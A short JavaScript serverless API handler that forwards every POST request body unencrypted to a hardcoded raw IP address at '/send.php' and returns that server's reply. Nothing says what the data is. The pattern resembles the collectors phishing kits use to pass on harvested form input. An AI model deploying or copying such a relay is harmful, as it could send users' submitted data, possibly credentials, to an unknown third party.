export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).json({ error: "Only POST requests are allowed" });
    }

    const response = await fetch("http://104.194.133.124/send.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body: new URLSearchParams(req.body).toString(),
    });

    const data = await response.text();
    res.status(response.status).send(data);
}
